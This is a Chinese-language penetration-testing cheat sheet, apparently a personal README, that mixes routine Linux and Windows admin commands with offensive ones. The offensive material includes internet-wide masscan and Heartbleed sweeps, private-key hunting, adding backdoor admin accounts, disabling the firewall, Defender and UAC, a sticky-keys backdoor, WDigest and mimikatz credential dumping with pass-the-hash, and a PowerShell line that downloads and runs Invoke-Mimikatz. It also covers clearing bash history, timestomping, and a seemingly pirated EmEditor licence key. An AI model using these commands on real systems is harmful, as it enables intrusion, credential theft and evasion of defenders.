# go-bi-soft
```
ufw allow 22
ufw delete allow 22
ufw enable
ufw disable
ufw status
```
# 主机推荐
+ https://www.vultr.com/
+ https://www.dynu.com/
+ https://www.gmail.com/

# 搜索引擎
+ https://www.greynoise.io/
+ https://www.zoomeye.org/
+ https://www.shodan.io/
+ https://fofa.info/
+ https://publicwww.com/
+ https://natlas.io/
+ https://www.qwant.com/
+ https://rapiddns.io/
+ https://dnsdumpster.com/
+ https://www.virustotal.com/gui/home/search
+ https://domainbigdata.com/
+ https://www.robtex.com/cidr/

# 反弹shell
+ https://www.revshells.com/

# OS提权
+ https://gtfobins.github.io/


# gost(GO语言)实现的安全隧道
```
./gost -L=:1080	//作为标准HTTP/SOCKS5代理
./gost -L=admin:123456@:1080	//设置代理认证信息
./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
```
# ipv4的3段私有IP地址

```
A类：10.0.0.0/8	即10.0.0.0-10.255.255.255

B类：172.16.0.0/12 即172.16.0.1-172.31.255.254

C类：192.168.0.0/16 即192.168.0.1-192.168.255.254
```
# 探测大网络空间中的存活主机

扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 在足够迅速的前提下，宁可牺牲掉一些准确性。
```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 10.txt 10.0.0.0/8 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 172.txt 172.16.0.0/12 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 192.txt 192.168.0.0/16 > /dev/null 2>&1
或
fping -a -g 10.0.0.0/8 >10.txt
fping -a -g 172.16.0.0/12 >172.txt
fping -a -g 192.168.0.0/16 >192.txt
或
masscan 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --ping --max-rate 100000 >all.txt
masscan 0.0.0.0/0 -p443,8443 --max-rate 100000 --heartbleed >443.txt	//心脏滴血漏洞扫描
masscan -p80 0.0.0.0/0 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --max-rate 300000 >all.txt	//扫描全网80端口ip段，排除内网ip段(或机房ip段)
或
masscan -p80 0.0.0.0/0 --excludefile blackip.txt --max-rate 300000 >all.txt	//扫描全网80端口ip段，blackip.txt填写排除ip地址或ip段每行一个
```
**备注** Windows、Mac或VM没有针对数据包传输进行调整，每秒只能获得大约300,000个数据包，而Linux可以每秒执行1,500,000个数据包。

# 大型网络常用渗透端口
`masscan -p21,22,23,161,389,445,873,1080,1433,1521,2049,2376,3000,3306,3389,3690,4848,5432,6379,7001,7002,8000,8161,8080,9000,9200,9990,11211,27017,50000 --banners --max-rate 100000 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 > result.txt`
```
21,22,53,80-89,161,389,443,445,873,1080,1098,1099,1352,1443,1194,1723,1433,1521,2049,2222,2376,3000,3306,3389,3690,4848,4899,5000,5432,5900,5984,6379,7001,7002,8000,8001,8291,8443,8080-8089,8161,8808,8888,8899,9080,9090,9200,9300,9999,10443,27017,27018,50000
```
# ssh免密登录私钥收集
在gitlab或jenkins的服务器上通常存在id_rsa私钥(实现免密登录)
```
find / -name id_rsa	//查找私钥
ssh -i id_rsa user@xxx	//公钥免密登录
```

# Windows渗透常用命令
```
type  *.txt  > all.txt	//多个txt文件合并
net user test 1234 /add	//添加新用户
net localgroup administrators test /add	//添加新用户到管理员组
taskkill /F /IM "cmd.exe"	//按名称杀死进程
taskkill /pid xxx -t -f	//强制结束pid进程和子进程
shutdown /r /t 0	//立即重启
shutdown /s /t 0	//立即关机
fsutil fsinfo drives	//查找系统上的所有硬盘/存储分区
netsh firewall set opmode disable	//关闭Windows防火墙
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f	//将管理员的UAC行为设置为"不提示"
netsh Advfirewall set allprofiles state off	//关闭防火墙
netsh Advfirewall set allprofiles state on	//开启防火墙
netsh Advfirewall show allprofiles	//检查防火墙状态
netsh -c interface dump	//将当前网络配置导出查看
sc query | more	//检查系统所有服务
sc stop cc_cometDaemon.exe	//停止服务
sc start cc_cometDaemon.exe	//开启服务
sc query cc_cometDaemon.exe	//检查停止状态
sc config cc_cometDaemon.exe start=disabled	//禁用服务
sc config cc_cometDaemon.exe start=auto	//服务自启动
wmic process where Name="xxx.exe" get ProcessId,name,commandline	//查询某进程信息.进程id、进程名、执行命令 
C:/WINNT/system32/inetsrv/MetaBase.bin	//IIS 5 中，IIS 的配置文件
C:/WINDOWS/system32/inetsrv/MetaBase.xml	//IIS 6 中，IIS 的配置文件
C:/WINDOWS/system32/inetstr/config/applicationHost.config	//IIS 7 中，IIS 的配置文件
或
iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=
iis7/8:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=
iis7/8:  %windir%\system32\inetsrv\appcmd list site	//查看网站列表
iis7/8:  %windir%\system32\inetsrv\appcmd list sites /state:started	//列出开始的站点
iis7/8:  %windir%\system32\inetsrv\appcmd list sites /state:stopped	//列出停止的站点
type c:\windows\system32\drivers\etc\hosts	//查看hosts文件
netsh firewall set icmpsetting 8	//开启外部ping
netsh firewall set icmpsetting 8 disable	//禁止外部Ping
ipconfig /displaydns	//查看本地DNS缓存
wmic OS get Caption, CSDVersion, OSArchitecture, Version	//获取系统版本信息
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct get /format:LIST	//查找系统安装的杀毒软件
wmic product get name,version	//查看当前安装的程序
net config workstation	//查看当前登陆域
cmdkey /list	//获取远程桌面连接过的历史账户列表
attrib +h "your_folder_or_file"	//隐藏文件夹或文件
attrib +h "d:\demo\*" /s /d
dir /a:h	//列出隐藏文件
attrib -s -h "your_hidden_folder_or_file"	//取消隐藏文件夹或文件

REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f	//关闭 Windows Defender 杀毒
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 0 /t REG_DWORD /f	//开启 Windows Defender 杀毒
REG add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1	//将regedit值设置为1并启动wdigest auth抓取明文密码
REG query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential	//查询是否启用wdigest auth抓取明文密码
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /d "RUNASADMIN" /f	//以管理员权限执行命令
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /f	//删除以管理员权限执行命令
mstsc /admin /v:192.168.58.129	//突破终端服务器已超过允许的最大连接数
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	//启用RDP访问3389
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //十六进制转十进制，查看rdp端口
或
tasklist /svc |find "TermService" //查看系统进程TermService服务对应的PID
netstat -ano | findstr pid	//查找TermService服务PID对应的端口
或
for /f "tokens=2 delims=x" %a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" ^| find "PortNumber"') do (set /a n=0x%a)
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser /t REG_DWORD /d 0 /f	//设置单用户允许多个RDP会话
REG query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser	//查看是否开单用户允许多个RDP会话
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f	//sethc粘键后门后门
ntsd -cq -pn SafeDogGuardCenter.exe	//搞死安全狗3.x
for /r c:\ %i in (Newslist*.aspx) do @echo %i	//在WINDOWS下命令查找文件
```
# mimikatz常用命令
```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit	//获取密码
procdump.exe -accepteula -ma lsass.exe lsass.dmp	//32系统转储内存
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp	//64系统转储内存
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"	//通过转储内存文件获取密码
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /ntlm:{NTLM_hash} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递哈希
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /aes256:{aes256_hmac} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递AES-KEY
PowerShell IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’) ; Invoke-Mimikatz -DumpCreds	//远程加载mimikatz
```
# Linux系统信息
```
uname -a //查看内核/操作系统/CPU信息
cat /etc/issue //查看操作系统版本
cat /proc/version	//查看系统版本
cat /proc/cpuinfo //查看CPU信息
hostname //查看计算机名
userdel -r user	//删除用户并清除home目录
runlevel //查看运行级别
lsusb -tv //列出所有USB设备
env //查看环境变量
updatedb	//更新locate的默认数据库增加索引 
pinky //当前已登陆用户
sudo -l	//当前用户可以以root身份执行的命令
curl ifconfig.me	//获取本机外网ip地址
curl https://ip.cn	//获取本机外网ip地址
cat /etc/ppp/chap-secrets	//获取vpn服务pptp账号密码
strings /usr/sbin/sshd | grep /
strings /usr/sbin/sshd | grep password 	//查看ssh后门记录路径文件
rpm -qV pam	//centos rpm校验已安装pam包是否被修改
cat /etc/psa/.psa.shadow	//显示Plesk管理员密码
tail -n 100 error_log	//显示该文件的最新100行
tail -f access_log	//实时查看该文件更新
pkill -kill -t tty	//强制踢掉登录用户tty
cat /etc/network/interfaces	//查看网卡信息
pwgen	//复杂密码随机生成工具
apt-get install net-tools	//debian新版默认没有ifconfig、netstat需要安装net-tools包
ip a	//debian新版查看ip命令
apt-get install geany	//Geany编辑器
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'	//列出所有超级用户帐户
sed -i 's/#Port 22/Port 42318/' /etc/ssh/sshd_config	//替换sshd服务端口
cat /etc/shells	//有效登录shell的路径名
cat /etc/resolv.conf	//显示配置的DNS服务器地址
[space]set +o history	//[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。
[Space]set -o history	//它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。
export ALL_PROXY=socks5://127.0.0.1:1080	//只对当前终端有效，强制命令走socks5代理
grep -r -l -i -I passw /	//查找其中包含字符串“ passw”的文件
find /etc/ -readable -type f 2>/dev/null	//列出我们可以阅读的配置文件
find /var/log -readable -type f 2>/dev/null 	//列出我们可以阅读的日志文件
cut -d: -f1 /etc/passwd	//获取当前账户列表
7z a -t7z -r -mx=9 xxx.7z dir/	//7z极限压缩
rpm -q --qf "%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n" pam	//通过使用rpm 的--qf或 --queryformat选项，可以分别输出这些字段和其他字段pam-1.1.8-9.el7.x86_64
dpkg-query -W -f='${Package}-${Version}-${Architecture}\n' libpam-modules-bin	//通过使用dpkg-query的-W和-f或--showformat选项，可以分别输出这些字段和其他字段libpam-modules-bin-1.3.1-5-amd64
grep -nv 'root' /etc/passwd	//过滤出不带有某个关键词的行并输出行号
lsof -u root	//查看某个用户启动了什么进程
lsof -i:8080	//某个端口是哪个进程打开的
netstat -anp	//a参数是列出所有连接，n是不要解析机器名，p列出进程名
ps -ef | grep tomcat	//查看tomcat进程
netstat -anop | grep 5517	//根据进程号查看tomcat端口号
```
# 反病毒常用
```
netstat -antp
ps auxef
while true; do netstat -antp | grep [ip]; done 
ll /proc/[pid]/exe	//查找进程文件
strace -tt -T -e trace=all -p [pid]	//跟踪异常进程运行情况
lsof-p [pid]	//查看进程打开的文件
grep "Accepted " /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'	//查看登录成功的日期、用户名及ip
find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ /var/spool/cron/ -type f -mtime -1 | xargs ls -l
awk -F ":" '$3==0{print $1}' /etc/passwd	//查找特权用户
awk '/\$1|\$6/{print $1}' /etc/shadow	//查找可以远程登录的账号信息
cat /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"	//查找sudo权限账户
grep "Failed password" /var/log/secure | awk {'print $9'} | sort | uniq -c | sort -nr	//查看爆破用户名字典 
cat /etc/rc.local
service –status-all
chkconfig --list	//确认是否有异常开机启动项 
grep -rn "[ip]" * /	//查找关键字
ps -ef | grep sshd	//跟踪SSHD进程
strace -o sshd.strace -f -p [pid]	//跟踪异常进程运行情况,并输出到sshd.strace
cat sshd.strace	//查看异常进程情况
strings -td /lib/x86_64-linux-gnu/security/pam_unix.so	//pam_unix.so文件字符串检查
```
# 网络信息
```
ifconfig	//查看所有网络接口的属性
iptables -L	//查看防火墙设置
route -n	//查看路由表
netstat -lntp	//查看所有监听端口
netstat -antp	//查看所有已经建立的连接
netstat -s	//查看网络统计信息
```
# 文件查找
```
find . -name '*.php' -mmin -60	//检查60分钟内当前目录中.PHP文件被修改过的文件
find . -name '*.php' -mtime 0	//查找当前目录中24小时内修改过的PHP文件,这个比较常用于网页文件的检查，是否有被修改的痕迹。
find . -name "[A-Z]*" -print	//查找当前目录中以有大写字母开头的文件
find /www -name "vps*" -print	//查找www目录中以vps开头的文件
find . -perm 777 -print	//查到当前目录中具有777权限的文件
find . -size +1000000c -print	//查找当前目录中文件字节数大于1MB的文件
find -type f -mtime -3	//最近3天修改过的文件
find -type f -ctime -3	//最近3天创建的文件
```
# chcon命令更改SELinux安全上下文

+ 错误的安全上下文`unconfined_u:object_r:admin_home_t:s0`
+ 正确的安全上下文`system_u:object_r:httpd_config_t:s0`

```
ls -lZ xxx	//查看安全上下文
chcon --reference=ssl.conf httpd.conf	//使用ssl.conf安全上下文用于httpd.conf
```
# lrzsz上传下载
```
yum -y install lrzsz	//安装
rz filename		//上传
sz filename 	//下载
```
# SSH免密码登录
```
ssh-keygen	//在本地服务器上生成密钥对
ssh-copy-id -i ~/.ssh/id_rsa.pub UserName@RemoteServer	//在远程服务器上安装公钥,SSH公钥保存在远程Linux服务器的.ssh/authorized_keys文件中
ssh root@x.x.x.x -i ~/.ssh/id_rsa	//id_rsa免密登陆,修改id_rsa权限chmod 600 id_rsa
```
# whereis搜索程序名和which路径查找
```
whereis	//命令搜索程序名
which	//命令是查找命令是否存在，以及命令的存放位置在哪儿
```
# 后台运行
```
nohup /usr/local/node/bin/node /www/im/chat.js >> /usr/local/node/output.log 2>&1 &	//不挂断地运行命令,在后台运行
```

# 用chattr命令防止系统中某个关键文件被修改
```
chattr +i /etc/fstab	//开启文件或目录的该项属性
chattr -i /etc/fstab	//关闭文件或目录的该项属性
lsattr passwd			//查看文件属性
s---ia-------e-- passwd
chattr -isa /etc/passwd	//关闭文件sai属性
```
# who命令查看用户登录时间
```
who /var/log/wtmp
```
# touch命令用于创建文件或修改文件/目录的时间戳
```
stat tgs.txt	//命令查看当前文件的时间戳
touch -d "2012-10-19 12:12:12.000000000 +0530" tgs.txt	//使用字符串来更改时间
touch -r tgs.txt a.txt 	//使用tgs.txt文件的访问和修改时间戳更新文件a.txt的时间戳
```
# 清除BASH历史
```
<space>命令	//在命令前放置一个空格，它不会保存在Bash历史记录中
history -cw	//清除所有Bash历史记录
history -dw 352	//从Bash历史记录文件中删除某一行(例如352)
history -r	//仅清除当前会话的Bash历史记录
export HISTSIZE=0	//禁用当前会话的所有历史记录
export HISTFILE=/dev/null	//丢弃当前会话的所有历史记录
[space]set +o history	//单次会话中禁用某一段命令记录
[Space]set -o history	//单次会话中启用某一段命令记录
```
# nmap代理扫描
```
proxychains nmap -sT -PN -n -sV -p 80,443,21,22 217.xx.xx.xx
```
# tar打包命令
```
tar -zcvf  test.tar.gz  /home/test/ --ignore-failed-read	//直接打包tar.gz
tar -xvf  test.tar.gz	//解压缩tar.gz
tar --exclude /home/public_html/img -zcvf test.tar.gz  /home/public_html/	//排除目录img
tar -tvf test.tar.gz | more	//列出tar.gz压缩包内容
tar czvf test.tar.gz --exclude=\*.{jpg,gif,png,wmv,flv,tar.gz,zip} /home/me	//排除多个特定文件类型
tar -zcvf /tmp/test.tar.gz -X exclude.txt /home/me	//排除多目录或特定文件类型
cat exclude.txt	//附加文件名
abc
xyz
*.bak
```
# Centos/Debian/Ubuntu安装masscan
```
yum install -y unzip gcc make libpcap-devel
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
make && make install && cd ../ && rm -rf master.zip masscan*
或
sudo apt-get install -y unzip gcc make libpcap-dev
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
sudo make && sudo make install && cd ../ && rm -rf master.zip masscan*
```
# nbtscan安装
```
wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz -O /tmp/nbtscan.tgz && mkdir /tmp/nbtscan && rm -rf nbtscan.tgz && tar -xvzf nbtscan.tgz -C /tmp/nbtscan && cd /tmp/nbtscan && make && ./nbtscan
wget https://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm && rpm -ivh nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm && rm -rf nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm
```

# 编辑器
+ [EmEditor](https://www.emeditor.com/)
  + DMAZM-WHY52-AX222-ZQJXN-79JXH
+ [Sublime Text](https://www.sublimetext.com/) 
+ [Notepad++](https://github.com/notepad-plus-plus/notepad-plus-plus/releases)
+ 
# 本地代理
+ [Proxifier](https://www.proxifier.com/)
  +   模拟器代理规则[雷电、夜神] `ldboxheadless.exe; noxvmhandle.exe`

# 安卓抓包
## 绕过证书固定
+ [JustTrustMe](https://github.com/Fuzion24/JustTrustMe)
+ [Android-SSL-TrustKiller](https://github.com/iSECPartners/Android-SSL-TrustKiller)
+ [burpsuite+brida](https://github.com/portswigger/brida)
+ [Sandroid-ssl-pinning-demo(证书固定演示)](https://github.com/httptoolkit/android-ssl-pinning-demo/releases)
+ [apk-mitm(自动修改apk)](https://github.com/shroudedcode/apk-mitm)

# 参考链接
+ https://medium.com/globant/testing-ssl-pinning-in-a-mobile-application-2dcac9ab3d0c
+ https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/
+ https://github.com/httptoolkit/android-ssl-pinning-demo
+ https://vavkamil.cz/2019/09/15/how-to-bypass-android-certificate-pinning-and-intercept-ssl-traffic/
+ https://arben.sh/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/
+ https://codeshare.frida.re/@sowdust/universal-android-ssl-pinning-bypass-2/
+ https://justinpineda.com/2020/11/27/bypassing-ssl-pinning-and-traffic-redirection-to-burp-suite-using-mobsf-and-genymotion/
+ https://www.freebuf.com/sectool/280622.html
+ https://github.com/shroudedcode/apk-mitm

# 漏洞wiki
+ https://cobalt.io/vulnerability-wiki
+ https://github.com/swisskyrepo/PayloadsAllTheThings

# Md5解密
+ https://www.cmd5.com/
+ https://www.somd5.com/
+ https://hashes.com/zh/decrypt/hash

# 在线反编译器
+ [JAR String Editor](https://www.decompiler.com/jar-string-editor)

# 文件传输
+ https://transfer.sh/

# 端口转发
+ https://ngrok.com/

# xss平台
+ https://xsshunter.com/

# 实验软件环境
+ [Redis for Windows](https://github.com/tporadowski/redis/releases/)
  + [Another Redis DeskTop Manage](https://github.com/qishibo/AnotherRedisDesktopManager/releases) 
